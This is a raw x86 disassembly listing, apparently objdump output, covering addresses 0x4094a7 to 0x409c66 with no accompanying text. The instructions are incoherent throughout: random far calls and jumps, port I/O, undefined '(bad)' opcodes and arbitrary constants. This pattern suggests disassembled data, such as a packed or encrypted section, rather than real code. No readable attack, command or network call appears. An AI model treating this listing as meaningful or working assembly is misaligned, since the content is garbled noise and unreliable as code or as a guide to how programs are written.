  4094a7:	adc    DWORD PTR gs:[edx+0x4d8213bd],eax
  4094ae:	rol    bh,cl
  4094b0:	and    BYTE PTR [edx],bh
  4094b2:	aad    0xce
  4094b4:	cdq    
  4094b5:	cmp    al,0x98
  4094b7:	jb     0x409504
  4094b9:	arpl   WORD PTR [ebx],bx
  4094bb:	jge    0x4094fb
  4094bd:	sub    bh,ah
  4094bf:	cmp    BYTE PTR [edx],0x45
  4094c2:	shl    DWORD PTR ds:0xa53a3926,1
  4094c8:	add    al,0x31
  4094ca:	cdq    
  4094cb:	and    bl,BYTE PTR [ebx+edx*8-0x59]
  4094cf:	js     0x4094d9
  4094d1:	mov    ds:0x55316a0f,eax
  4094d6:	lods   al,BYTE PTR ds:[esi]
  4094d7:	pushf  
  4094d8:	retf   
  4094d9:	pop    esi
  4094da:	and    bh,BYTE PTR [eax-0x439a05b]
  4094e0:	fsub   st(3),st
  4094e2:	ins    DWORD PTR es:[edi],dx
  4094e3:	jle    0x409474
  4094e5:	xchg   edx,eax
  4094e6:	jecxz  0x4094d9
  4094e8:	in     al,dx
  4094e9:	shl    DWORD PTR [ebx],0xf6
  4094ec:	xchg   ecx,eax
  4094ed:	es pop ss
  4094ef:	pop    edx
  4094f0:	mov    BYTE PTR [edx-0x5],bl
  4094f3:	or     BYTE PTR [eax+0x327a459b],bh
  4094f9:	test   al,0xca
  4094fb:	icebp  
  4094fc:	pop    ebp
  4094fd:	test   DWORD PTR [esi+0x7b],esp
  409500:	xchg   ch,bh
  409502:	loope  0x409497
  409504:	test   eax,0x9ad80204
  409509:	push   ds
  40950a:	xchg   ebp,eax
  40950b:	adc    BYTE PTR [ecx],0x99
  40950e:	mov    eax,ds:0x79507800
  409513:	xor    ebp,esp
  409515:	push   0x9ba5e1ad
  40951a:	repnz fild DWORD PTR [eax]
  40951d:	mov    ds:0x9d7ae728,al
  409522:	add    dh,bh
  409524:	and    DWORD PTR [ecx-0x4e],0xd6351d90
  40952b:	xor    esp,DWORD PTR [edx-0x1f]
  40952e:	and    BYTE PTR [ecx],0x5f
  409531:	xor    ecx,DWORD PTR [edi]
  409533:	sbb    al,0x6f
  409535:	pop    edi
  409536:	mov    ah,0x75
  409538:	call   0x5f90:0x639f4c20
  40953f:	lahf   
  409540:	imul   ebx
  409542:	test   ebp,esi
  409544:	not    DWORD PTR [ebx-0x8]
  409547:	gs jle 0x4095a6
  40954a:	pop    ss
  40954b:	jmp    0x4094d2
  40954d:	xchg   ecx,eax
  40954e:	mov    eax,0x81db1a5b
  409553:	mov    ebx,0xed36d249
  409558:	cmc    
  409559:	in     al,dx
  40955a:	in     al,0x48
  40955c:	pushf  
  40955d:	pushf  
  40955e:	jno    0x409563
  409560:	in     al,dx
  409561:	mov    al,0x55
  409563:	or     DWORD PTR [edi+0x5770dbd2],esp
  409569:	and    DWORD PTR [edi],ecx
  40956b:	scas   eax,DWORD PTR es:[edi]
  40956c:	ins    BYTE PTR es:[edi],dx
  40956d:	je     0x409527
  40956f:	sub    edx,ebx
  409571:	ss xor al,0xd8
  409574:	sub    al,0xf8
  409576:	bound  edi,QWORD PTR [eax+0x26]
  409579:	cmp    DWORD PTR [ebx-0x21],edx
  40957c:	stos   DWORD PTR es:[edi],eax
  40957d:	mov    al,ds:0xfe34c752
  409582:	push   esp
  409583:	jne    0x4095a5
  409585:	fsub   DWORD PTR [ebp+0xb]
  409588:	loop   0x40955f
  40958a:	gs cmp al,0x1b
  40958d:	ror    BYTE PTR [esi-0x45e13ad5],cl
  409593:	cmp    al,0x85
  409595:	jns    0x40953a
  409597:	mov    eax,0x614866f5
  40959c:	inc    ecx
  40959d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40959e:	xor    eax,0x88f8d5e6
  4095a3:	jae    0x409537
  4095a5:	push   eax
  4095a6:	stos   BYTE PTR es:[edi],al
  4095a7:	sbb    esi,esp
  4095a9:	lds    edi,FWORD PTR [ebx]
  4095ab:	repz push esi
  4095ad:	push   0xffffffe5
  4095af:	jmp    0x6d12:0x19bdc3a6
  4095b6:	pusha  
  4095b7:	in     al,dx
  4095b8:	retf   0x729a
  4095bb:	ds aam 0xfc
  4095be:	dec    edx
  4095bf:	int3   
  4095c0:	inc    edx
  4095c1:	shl    BYTE PTR [edi-0x427a351a],1
  4095c7:	inc    ebp
  4095c8:	lahf   
  4095c9:	ja     0x409558
  4095cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095cc:	cmp    esi,DWORD PTR [esi+0x63]
  4095cf:	shr    BYTE PTR [edx+0x641fb32a],cl
  4095d5:	push   ebp
  4095d6:	or     ecx,DWORD PTR [ebx+0x4ff0ee39]
  4095dc:	sbb    eax,0x3703fb5a
  4095e1:	jae    0x4095ba
  4095e3:	outs   dx,DWORD PTR ds:[esi]
  4095e4:	jle    0x4095da
  4095e6:	and    DWORD PTR [eax-0x5ea8146],ebx
  4095ec:	call   0x1b98dd64
  4095f1:	jbe    0x409661
  4095f3:	stos   DWORD PTR es:[edi],eax
  4095f4:	out    dx,eax
  4095f5:	js     0x40958b
  4095f7:	add    esi,DWORD PTR [ecx+ebp*8-0xaa8de0b]
  4095fe:	fnstsw WORD PTR [ecx+0x377275e7]
  409604:	pushf  
  409605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409606:	aam    0x48
  409608:	mov    ebx,0x641bea79
  40960d:	xor    ch,ch
  40960f:	rol    DWORD PTR [edx],0x5
  409612:	hlt    
  409613:	adc    eax,0x8389c14c
  409618:	inc    DWORD PTR [ebx]
  40961a:	gs sahf 
  40961c:	leave  
  40961d:	xor    esi,DWORD PTR [edx]
  40961f:	addr16 loope 0x4095df
  409622:	std    
  409623:	daa    
  409624:	repnz xchg ebp,eax
  409626:	add    BYTE PTR [ebp-0x4079850],0x29
  40962d:	add    al,0x57
  40962f:	in     eax,0xaa
  409631:	add    eax,0x29c40d8a
  409636:	shl    dl,0x73
  409639:	sbb    al,0xd2
  40963b:	jmp    0x707f:0x7345dd5f
  409642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409643:	sti    
  409644:	dec    edi
  409645:	inc    esi
  409646:	test   BYTE PTR [ebp+0x11315859],cl
  40964c:	ds pop es
  40964e:	dec    edx
  40964f:	or     eax,0x435764d2
  409654:	or     al,0x20
  409656:	inc    ebx
  409657:	je     0x409636
  409659:	pop    eax
  40965a:	inc    ebp
  40965b:	adc    eax,0x34b4d527
  409660:	mov    cl,0x5
  409662:	mov    cl,0xfd
  409664:	outs   dx,DWORD PTR ds:[esi]
  409665:	sbb    edi,DWORD PTR [edi+0x4a]
  409668:	push   0x1d8efa1e
  40966d:	jae    0x40969e
  40966f:	and    al,0xa3
  409671:	gs inc eax
  409673:	ins    BYTE PTR es:[edi],dx
  409674:	cwde   
  409675:	cmp    DWORD PTR [eax],ebx
  409677:	or     dh,BYTE PTR [ecx]
  409679:	jl     0x409607
  40967b:	sete   BYTE PTR [edi+0x43991d57]
  409682:	mov    al,0xaa
  409684:	sub    BYTE PTR [esi],cl
  409686:	xchg   BYTE PTR [ebx-0x7bed46bf],cl
  40968c:	jle    0x409698
  40968e:	popf   
  40968f:	shr    esi,1
  409691:	mov    al,0xc0
  409693:	leave  
  409694:	mov    ecx,0x3045298f
  409699:	push   ds
  40969a:	lahf   
  40969b:	xlat   BYTE PTR ds:[ebx]
  40969c:	pop    ebp
  40969d:	mov    ch,0x0
  40969f:	jbe    0x4096e7
  4096a1:	xor    edx,edx
  4096a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096a5:	pop    edi
  4096a6:	lock arpl WORD PTR [ebx-0x17e1a249],cx
  4096ad:	test   al,cl
  4096af:	or     BYTE PTR [edx+ecx*2],ch
  4096b2:	and    eax,0x1ab41091
  4096b7:	pop    edx
  4096b8:	loope  0x4096ce
  4096ba:	mov    ch,0x91
  4096bc:	lahf   
  4096bd:	aad    0x88
  4096bf:	mov    edi,0x4b2b5a96
  4096c4:	xchg   edx,eax
  4096c5:	mov    edi,0x621ad50d
  4096ca:	fidiv  DWORD PTR [esi]
  4096cc:	sbb    DWORD PTR [edi+0x32c63e23],ecx
  4096d2:	mov    esp,0x87599ec7
  4096d7:	sbb    al,0x5e
  4096d9:	sahf   
  4096da:	out    dx,al
  4096db:	pop    esp
  4096dc:	mov    eax,0xadd38f5b
  4096e1:	jb     0x4096f1
  4096e3:	add    cl,BYTE PTR [ebp+0x35]
  4096e6:	xor    ch,BYTE PTR [ebx-0x1a5e6b7b]
  4096ec:	fnstenv [ebp+0x2a]
  4096ef:	sbb    DWORD PTR [ebx],ebx
  4096f1:	or     bl,BYTE PTR [ebp+0x5f101118]
  4096f7:	adc    ah,BYTE PTR [ebx-0xf]
  4096fa:	adc    eax,0xe955608
  4096ff:	call   0x15ed:0x141968b1
  409706:	sub    bl,BYTE PTR [esi+0x4e]
  409709:	imul   edi,DWORD PTR [ecx-0x74],0xffffffc9
  40970d:	jle    0x40977e
  40970f:	out    dx,eax
  409710:	popa   
  409711:	adc    BYTE PTR ds:[esi+0x63],bl
  409715:	fwait
  409716:	cmp    eax,0x8e2c4547
  40971b:	bound  ebp,QWORD PTR [ebx-0x64]
  40971e:	mov    al,ds:0x6a72a0d4
  409723:	xor    ah,dh
  409725:	mov    ebp,0xd6a011ce
  40972a:	dec    esi
  40972b:	sbb    ebp,edi
  40972d:	rcr    BYTE PTR [edi],1
  40972f:	pushf  
  409730:	xchg   ebx,eax
  409731:	imul   edx,DWORD PTR [ebx],0x6b886c30
  409737:	push   esi
  409738:	or     dl,BYTE PTR [edx-0x5c6fabcf]
  40973e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40973f:	pop    edi
  409740:	add    eax,0x5cc36f4d
  409745:	arpl   ax,ax
  409747:	mov    edx,0x2e3dbc3c
  40974c:	bndldx bnd2,gs:[edx]
  409750:	dec    ebp
  409751:	adc    dh,bl
  409753:	aaa    
  409754:	pop    ebx
  409755:	sbb    eax,0xfd061902
  40975a:	std    
  40975b:	xchg   edx,eax
  40975c:	adc    al,BYTE PTR [eax-0x19]
  40975f:	(bad)  
  409760:	ins    BYTE PTR es:[edi],dx
  409761:	outs   dx,BYTE PTR ds:[esi]
  409762:	cmp    ebp,DWORD PTR [eax]
  409764:	jge    0x40975c
  409766:	jbe    0x409711
  409768:	ss and ah,ah
  40976b:	adc    BYTE PTR [ebx],cl
  40976d:	pushf  
  40976e:	push   edi
  40976f:	addr16 das 
  409771:	push   0xffffffc2
  409773:	test   eax,0x83d23937
  409778:	pop    edx
  409779:	adc    eax,0xf6c0668
  40977e:	lods   al,BYTE PTR ds:[esi]
  40977f:	mov    edi,0x65f83e7a
  409784:	inc    esp
  409785:	fs inc ecx
  409787:	sub    eax,0x381accdc
  40978c:	and    DWORD PTR [edx-0x38],0xffffffa5
  409790:	pop    esi
  409791:	div    BYTE PTR [ebp-0x74]
  409794:	stos   BYTE PTR es:[edi],al
  409795:	cli    
  409796:	into   
  409797:	mov    dl,0x92
  409799:	aam    0x90
  40979b:	jne    0x4097fb
  40979d:	xchg   edx,eax
  40979e:	add    eax,0xf2b78d3f
  4097a3:	cwde   
  4097a4:	int3   
  4097a5:	call   0x9006:0xbb6846c2
  4097ac:	ds (bad) 
  4097ae:	xlat   BYTE PTR ds:[ebx]
  4097af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097b0:	inc    ebx
  4097b1:	ins    BYTE PTR es:[edi],dx
  4097b2:	imul   edx,DWORD PTR [edx+0x2a],0xc313a46b
  4097b9:	scas   eax,DWORD PTR es:[edi]
  4097ba:	push   cs
  4097bb:	ins    DWORD PTR es:[edi],dx
  4097bc:	cld    
  4097bd:	xchg   ecx,eax
  4097be:	call   0x89b9a779
  4097c3:	cmp    eax,0xa8c561d
  4097c8:	and    ch,BYTE PTR [eax-0xcc39d83]
  4097ce:	inc    edi
  4097cf:	(bad)
  4097d2:	mov    WORD PTR [edi-0x7d],?
  4097d5:	into   
  4097d6:	xor    DWORD PTR [ecx+0x244b4f96],ecx
  4097dc:	jg     0x4097e2
  4097de:	loope  0x409816
  4097e0:	stc    
  4097e1:	dec    ebx
  4097e2:	lods   eax,DWORD PTR ds:[esi]
  4097e3:	sub    ch,bh
  4097e5:	shr    DWORD PTR [edi+0x7],cl
  4097e8:	and    ecx,DWORD PTR [eax+eiz*2]
  4097eb:	cmp    eax,0x72f427b4
  4097f0:	mov    BYTE PTR [ebx-0x4f560ae8],dl
  4097f6:	sub    BYTE PTR [ecx],dh
  4097f8:	shl    BYTE PTR [eax],0x9e
  4097fb:	sub    cl,BYTE PTR [eax+0x3d]
  4097fe:	sar    DWORD PTR [edi],0xca
  409801:	mov    WORD PTR [eiz*4+0x2d5b7aa9],ds
  409808:	jne    0x40983e
  40980a:	inc    edi
  40980b:	inc    eax
  40980c:	jg     0x409835
  40980e:	aas    
  40980f:	xor    al,0x13
  409811:	mov    ebp,0xe3dd2658
  409816:	push   cs
  409817:	je     0x40988a
  409819:	std    
  40981a:	inc    esi
  40981b:	ficomp DWORD PTR [edi+0x34033e6c]
  409821:	and    DWORD PTR [edx+esi*4-0x41],edx
  409825:	inc    ebp
  409826:	or     cl,BYTE PTR [ebp-0x752d3ab5]
  40982c:	outs   dx,DWORD PTR ds:[esi]
  40982d:	popf   
  40982e:	rol    DWORD PTR [esp+ecx*4-0x2c],1
  409832:	push   ebx
  409833:	mov    dh,BYTE PTR [ebx-0x39]
  409836:	sbb    eax,DWORD PTR [edi+0x3c]
  409839:	adc    al,0x48
  40983b:	jmp    0x40989e
  40983d:	mov    eax,0x4d5c5d06
  409842:	sbb    al,0x4e
  409844:	imul   ebp,eax,0x406faa
  40984a:	fistp  WORD PTR [esp+ecx*8+0x1f]
  40984e:	mov    esi,DWORD PTR ds:0x1cafa41f
  409854:	and    eax,0x3af2b3bb
  409859:	mov    eax,0x10adb083
  40985e:	and    eax,0xcd5baf52
  409863:	retf   
  409864:	push   ss
  409865:	mov    eax,0xa3e5eaf4
  40986a:	pop    ss
  40986b:	sub    edi,DWORD PTR [eax+0x1346201b]
  409871:	xor    BYTE PTR [ebx+0x27],0xba
  409875:	jo     0x4098cf
  409877:	inc    esp
  409878:	sub    eax,0x3d1a89e3
  40987d:	lahf   
  40987e:	(bad)  
  409880:	pop    es
  409881:	mov    edi,ebp
  409883:	shl    DWORD PTR [edx],cl
  409885:	xor    eax,0xb8d2950
  40988a:	in     al,0xdc
  40988c:	sbb    DWORD PTR [edi+0x3],ebp
  40988f:	sti    
  409890:	mov    esp,0xcddbd4f2
  409895:	arpl   WORD PTR [esi],sp
  409897:	into   
  409898:	ins    BYTE PTR es:[edi],dx
  409899:	(bad)  
  40989a:	inc    BYTE PTR [ebx+0x6c2da49c]
  4098a0:	cmp    BYTE PTR [ecx-0x251f3671],al
  4098a6:	pop    eax
  4098a7:	bound  esi,QWORD PTR [edi-0x56]
  4098aa:	fcomip st,st(5)
  4098ac:	and    esi,DWORD PTR [edi]
  4098ae:	sub    al,BYTE PTR [edx-0x58]
  4098b1:	mov    esi,0x1c45663e
  4098b6:	mov    bh,0x0
  4098b8:	add    DWORD PTR [ebx-0x2d],esp
  4098bb:	push   ebp
  4098bc:	inc    esp
  4098bd:	push   ds
  4098be:	jecxz  0x409856
  4098c0:	cwde   
  4098c1:	pusha  
  4098c2:	(bad)  
  4098c3:	outs   dx,BYTE PTR ds:[esi]
  4098c4:	dec    edi
  4098c5:	mov    bl,0xc6
  4098c7:	fdiv   QWORD PTR [esi+0x16]
  4098ca:	stos   DWORD PTR es:[edi],eax
  4098cb:	mov    edi,0xe462d875
  4098d0:	inc    ebp
  4098d1:	(bad)  
  4098d2:	push   ebp
  4098d3:	add    eax,0x7e048e96
  4098d8:	mov    ebp,0x71bd1037
  4098dd:	pushf  
  4098de:	and    ah,ch
  4098e0:	repz xor esp,DWORD PTR [esp+eax*8-0x7f3f661f]
  4098e8:	dec    edi
  4098e9:	xchg   edx,eax
  4098ea:	mov    BYTE PTR [ecx],ah
  4098ec:	dec    ebx
  4098ed:	sub    esp,esp
  4098ef:	mov    dl,BYTE PTR [ebp-0x2]
  4098f2:	xchg   esp,eax
  4098f3:	sub    BYTE PTR [esi],ch
  4098f5:	sbb    edi,DWORD PTR [ebp+0x5e61ddd3]
  4098fb:	popa   
  4098fc:	out    dx,eax
  4098fd:	sbb    al,0xf3
  4098ff:	cmp    DWORD PTR [edx],edi
  409901:	bnd jns 0x4098df
  409904:	and    edx,esp
  409906:	cld    
  409907:	pushf  
  409908:	int    0x6f
  40990a:	out    0x4,al
  40990c:	outs   dx,BYTE PTR ds:[esi]
  40990d:	and    dh,BYTE PTR ds:0xac54c0bc
  409913:	push   edx
  409914:	add    DWORD PTR [esi+ebp*2+0x55c1a436],esp
  40991b:	push   eax
  40991c:	loop   0x409936
  40991e:	das    
  40991f:	adc    eax,0x1bf64a78
  409924:	call   0xb7c1:0x6f60b779
  40992b:	repz pop eax
  40992d:	adc    bh,0x1c
  409930:	inc    esp
  409931:	aam    0x46
  409933:	or     BYTE PTR [ebx-0x71f172e],cl
  409939:	out    0x9a,eax
  40993b:	or     BYTE PTR [ebx],dl
  40993d:	leave  
  40993e:	push   edx
  40993f:	inc    eax
  409940:	jmp    0x50733338
  409945:	jp     0x4099b6
  409947:	sub    BYTE PTR [edi],dl
  409949:	or     dl,BYTE PTR [bx+di]
  40994c:	cmc    
  40994d:	clc    
  40994e:	mov    ebx,0xb4d8dcc4
  409953:	inc    esi
  409954:	pop    eax
  409955:	mov    DWORD PTR [edi-0x72],ebp
  409958:	(bad)  
  409959:	push   esi
  40995a:	adc    esp,DWORD PTR [esi-0x75]
  40995d:	push   ecx
  40995e:	cwde   
  40995f:	fsqrt  
  409961:	push   ebx
  409962:	xchg   edi,eax
  409963:	out    0x45,al
  409965:	lea    edi,[edi]
  409967:	in     eax,0xa7
  409969:	ss xchg ecx,eax
  40996b:	jnp    0x409941
  40996d:	push   esi
  40996e:	mov    bl,0xbf
  409970:	pop    DWORD PTR [esp+edi*4]
  409973:	and    BYTE PTR [edx+0x3],al
  409976:	sbb    al,BYTE PTR [esi+0x64]
  409979:	ficomp WORD PTR [ebx*2+0x78a894c3]
  409980:	pop    eax
  409981:	fstp   DWORD PTR [esi]
  409983:	cmp    eax,0xb6f21117
  409988:	xor    BYTE PTR [ecx+ebx*8],bl
  40998b:	inc    eax
  40998c:	and    eax,0xffffffe5
  40998f:	dec    ecx
  409990:	mov    ebp,0xb142117b
  409995:	daa    
  409996:	mov    ch,0xb0
  409998:	into   
  409999:	add    edi,ebx
  40999b:	js     0x40996f
  40999d:	add    eax,0xbc9c6d89
  4099a2:	jno    0x409954
  4099a4:	mov    esp,0xd3d000c3
  4099a9:	clc    
  4099aa:	cmp    edx,edi
  4099ac:	iret   
  4099ad:	(bad)  
  4099ae:	adc    eax,0xf52764b5
  4099b3:	mov    cs,WORD PTR [edx]
  4099b5:	test   BYTE PTR [edi+0x4c],0x76
  4099b9:	iret   
  4099ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099bb:	jae    0x409a1e
  4099bd:	mov    ds:0xc08f31b5,al
  4099c2:	sub    al,0xea
  4099c4:	pop    esp
  4099c5:	int    0xef
  4099c7:	pop    ss
  4099c8:	or     DWORD PTR gs:[edi+0x21],esp
  4099cc:	shl    dl,0xb8
  4099cf:	fsubr  st,st(1)
  4099d1:	push   ecx
  4099d2:	sbb    DWORD PTR [edi+edi*1],edx
  4099d5:	and    ebx,DWORD PTR [eax+0x4f]
  4099d8:	xchg   BYTE PTR [eax],dl
  4099da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099db:	mov    ch,0xe5
  4099dd:	ins    BYTE PTR es:[edi],dx
  4099de:	daa    
  4099df:	mov    ds:0xfb7182fe,al
  4099e4:	in     al,0xf3
  4099e6:	pop    DWORD PTR [ecx]
  4099e8:	adc    al,0xac
  4099ea:	xor    eax,0x32887a66
  4099ef:	pop    eax
  4099f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099f1:	mov    ds:0xaa363e04,eax
  4099f6:	or     dl,ah
  4099f8:	fnstenv [esi-0xf]
  4099fb:	js     0x409a70
  4099fd:	and    al,0xa6
  4099ff:	mov    bh,0x50
  409a01:	aad    0xc6
  409a03:	(bad)  
  409a04:	pop    eax
  409a05:	mov    dh,0xd0
  409a07:	pop    eax
  409a08:	sahf   
  409a09:	jle    0x4099e1
  409a0b:	mov    ch,0xc4
  409a0d:	call   0xdb98:0xc5ee67cd
  409a14:	mov    al,0x89
  409a16:	loopne 0x4099bb
  409a18:	sub    bh,dl
  409a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a1b:	sbb    al,0xc1
  409a1d:	mov    esi,0xc46ed97c
  409a22:	leave  
  409a23:	and    ebx,DWORD PTR [ebx+ecx*8]
  409a26:	out    0x22,al
  409a28:	push   0x67
  409a2a:	mov    bl,0x2a
  409a2c:	pop    eax
  409a2d:	das    
  409a2e:	push   0xbc4fc2b4
  409a33:	mov    ds:0x3221583e,al
  409a38:	inc    esp
  409a39:	js     0x4099c9
  409a3b:	mov    edx,0x3e946b65
  409a40:	nop
  409a41:	out    0x79,al
  409a43:	jg     0x409a14
  409a45:	sbb    eax,0x440d7f73
  409a4a:	dec    ebx
  409a4b:	mov    ah,0xfc
  409a4d:	xchg   ebp,eax
  409a4e:	adc    bh,BYTE PTR [edx-0x1a2718a]
  409a54:	std    
  409a55:	or     edi,DWORD PTR [eax-0x76]
  409a58:	inc    ecx
  409a59:	push   ebx
  409a5a:	out    0xbf,al
  409a5c:	push   edi
  409a5d:	bound  ebx,QWORD PTR [eax+0x61c428ab]
  409a63:	and    eax,0x68cc4560
  409a68:	into   
  409a69:	sub    ebp,DWORD PTR ds:[eax]
  409a6c:	int    0x72
  409a6e:	push   cs
  409a6f:	push   edx
  409a70:	stos   DWORD PTR es:[edi],eax
  409a71:	div    dh
  409a73:	jle    0x409a39
  409a75:	xor    BYTE PTR [eax],ch
  409a77:	(bad)  
  409a78:	mov    esi,0x935af5ef
  409a7d:	shl    DWORD PTR [esi+0x1e83c562],0xa9
  409a84:	div    DWORD PTR [ecx-0xa61d3b5]
  409a8a:	jmp    0x7a86:0xab7ba5a1
  409a91:	call   0xf101:0xd725c3d4
  409a98:	stos   BYTE PTR es:[edi],al
  409a99:	mov    dl,0xe2
  409a9b:	(bad)  
  409a9c:	nop
  409a9d:	xchg   ebp,eax
  409a9e:	xchg   ebp,eax
  409a9f:	and    edi,edi
  409aa1:	jns    0x409a33
  409aa3:	ds lock mov cl,0x6b
  409aa7:	jb     0x409a63
  409aa9:	shl    BYTE PTR [di+0x5596],cl
  409aae:	adc    eax,0x74eb883a
  409ab3:	stc    
  409ab4:	loope  0x409b2a
  409ab6:	and    edx,DWORD PTR [edi-0x5b]
  409ab9:	fadd   st(1),st
  409abb:	test   DWORD PTR es:[ecx+edi*8-0x38],ebx
  409ac0:	pop    ss
  409ac1:	test   dl,cl
  409ac3:	xlat   BYTE PTR ds:[ebx]
  409ac4:	push   esp
  409ac5:	add    BYTE PTR [edi+0x576de48f],al
  409acb:	jecxz  0x409aae
  409acd:	(bad)  
  409ace:	loope  0x409a79
  409ad0:	adc    esp,esi
  409ad2:	sahf   
  409ad3:	mov    ds:0xaeeac280,al
  409ad8:	mov    al,0x6d
  409ada:	int    0xed
  409adc:	loope  0x409b39
  409ade:	inc    esi
  409adf:	xor    al,0x6
  409ae1:	push   ds
  409ae2:	or     esi,DWORD PTR [edi]
  409ae4:	hlt    
  409ae5:	cmp    eax,0xcbb7aabd
  409aea:	inc    ebp
  409aeb:	pop    ebp
  409aec:	icebp  
  409aed:	push   ecx
  409aee:	xchg   ecx,eax
  409aef:	xor    ecx,DWORD PTR es:[ebx-0x2255b2da]
  409af6:	ror    DWORD PTR [ebx+ecx*8],cl
  409af9:	mov    bh,0x2b
  409afb:	dec    edx
  409afc:	inc    ebx
  409afd:	push   edi
  409afe:	mov    ?,WORD PTR [ebp+0x51279056]
  409b04:	ffreep st(4)
  409b06:	scas   eax,DWORD PTR es:[edi]
  409b07:	data16 mov BYTE PTR [bx+di+0x36],dl
  409b0c:	shl    dh,cl
  409b0e:	js     0x409b7b
  409b10:	stos   DWORD PTR es:[edi],eax
  409b11:	and    ebp,0xc307b585
  409b17:	nop
  409b18:	int    0x95
  409b1a:	imul   esi,DWORD PTR [esi+0x2d],0x5551d24d
  409b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b22:	into   
  409b23:	push   ss
  409b24:	cld    
  409b25:	cs lock mov edx,0xf7cde850
  409b2c:	clc    
  409b2d:	adc    ebx,DWORD PTR [eax+eiz*1+0x54]
  409b31:	mov    DWORD PTR [ecx],edx
  409b33:	mov    BYTE PTR [eax],ch
  409b35:	mov    bh,0xc4
  409b37:	bts    DWORD PTR [esi],edi
  409b3a:	jmp    0xebc4:0x49cf13bf
  409b41:	xor    BYTE PTR [eax+0x78],cl
  409b44:	out    0x1c,al
  409b46:	mov    al,0x7f
  409b48:	or     cl,BYTE PTR [ebx+0x786b4012]
  409b4e:	xchg   esp,eax
  409b4f:	mov    gs,WORD PTR ds:0x629abc40
  409b55:	loope  0x409bab
  409b57:	mov    edi,DWORD PTR [ecx]
  409b59:	sbb    BYTE PTR [eax-0x7e835de2],ah
  409b5f:	add    al,0x19
  409b61:	jbe    0x409b24
  409b63:	pushf  
  409b64:	jb     0x409b10
  409b66:	xchg   ebp,eax
  409b67:	and    DWORD PTR [ebx+0x472c078b],0xffffff9b
  409b6e:	push   es
  409b6f:	nop
  409b70:	add    al,0xd0
  409b72:	(bad)  
  409b73:	push   0xffffffc0
  409b75:	jae    0x409b61
  409b77:	call   0x44f9:0xdf7cdefe
  409b7e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  409b80:	pop    ds
  409b81:	sbb    eax,0x70c18c08
  409b86:	mov    DWORD PTR [ecx+eax*8],eax
  409b89:	add    BYTE PTR [ecx+edi*2-0x7c],dh
  409b8d:	and    BYTE PTR [edx+0x6f9421c1],ah
  409b93:	jg     0x409b7b
  409b95:	scas   al,BYTE PTR es:[edi]
  409b96:	adc    esp,DWORD PTR [esi-0xd]
  409b99:	(bad)  
  409b9a:	pop    esi
  409b9b:	dec    eax
  409b9c:	mov    DWORD PTR [ebp+0x5ee31983],eax
  409ba2:	mov    ch,0x4a
  409ba4:	mov    bh,0xde
  409ba6:	addr16 dec ebp
  409ba8:	retf   
  409ba9:	add    bh,BYTE PTR [eax-0x4cfd84a8]
  409baf:	pop    ds
  409bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bb1:	xor    DWORD PTR [ecx],0x45f5fc14
  409bb7:	sbb    eax,0x8a5898a
  409bbc:	jg     0x409bf5
  409bbe:	into   
  409bbf:	push   es
  409bc0:	lock or ecx,ecx
  409bc3:	xor    al,0x4d
  409bc5:	sub    esp,DWORD PTR fs:[ebp+0x7aa690c4]
  409bcc:	sbb    ch,BYTE PTR [esi+0x68deab6d]
  409bd2:	xchg   edx,eax
  409bd3:	jbe    0x409bb3
  409bd5:	cmp    ecx,DWORD PTR [edx+0xb14565e]
  409bdb:	int3   
  409bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bdd:	jno    0x409baa
  409bdf:	cdq    
  409be0:	push   edi
  409be1:	loop   0x409bd5
  409be3:	or     al,0x8
  409be5:	mov    bh,0x55
  409be7:	sub    DWORD PTR [esi-0x7ff8093a],edi
  409bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bee:	jle    0x409c1b
  409bf0:	(bad)  
  409bf2:	xchg   esp,eax
  409bf3:	fbstp  TBYTE PTR [ecx]
  409bf5:	test   eax,0x9e0a4a33
  409bfa:	xchg   edx,eax
  409bfb:	xchg   dl,dh
  409bfd:	daa    
  409bfe:	test   DWORD PTR [eax-0x3d],0x9bf704bc
  409c05:	sbb    BYTE PTR [ebp+0x63],ah
  409c08:	ins    BYTE PTR es:[edi],dx
  409c09:	and    eax,0x105b4661
  409c0e:	test   al,0x4e
  409c10:	mov    eax,0x5aff2506
  409c15:	mov    ch,0xd3
  409c17:	test   eax,0x46b040ea
  409c1c:	outs   dx,BYTE PTR ds:[esi]
  409c1d:	xchg   DWORD PTR fs:[edi],ebx
  409c20:	xor    BYTE PTR ds:0x2e769b26,al
  409c26:	push   ebx
  409c27:	(bad)  
  409c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c29:	aad    0x3f
  409c2b:	push   0xffffffae
  409c2d:	clc    
  409c2e:	and    dh,dh
  409c30:	xor    DWORD PTR [ebp+0x71],eax
  409c33:	hlt    
  409c34:	stc    
  409c35:	rcl    BYTE PTR [edi-0x107b9d20],1
  409c3b:	aad    0x5a
  409c3d:	das    
  409c3e:	mov    ss,ecx
  409c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c41:	adc    ch,BYTE PTR [ecx-0x7a]
  409c44:	mov    ebx,DWORD PTR [edx]
  409c46:	cld    
  409c47:	add    al,0xb8
  409c49:	(bad)  
  409c4a:	in     al,0x4a
  409c4c:	sbb    BYTE PTR [eax],cl
  409c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c4f:	fstp   DWORD PTR [esi+0x674e0483]
  409c55:	mov    al,ds:0x7d6a1ff0
  409c5a:	or     DWORD PTR [eax-0x6f974c70],0x17
  409c61:	mov    ebx,ebx
  409c63:	jle    0x409c49
  409c65:	out    dx,eax
  409c66:	jae    0x409c0a
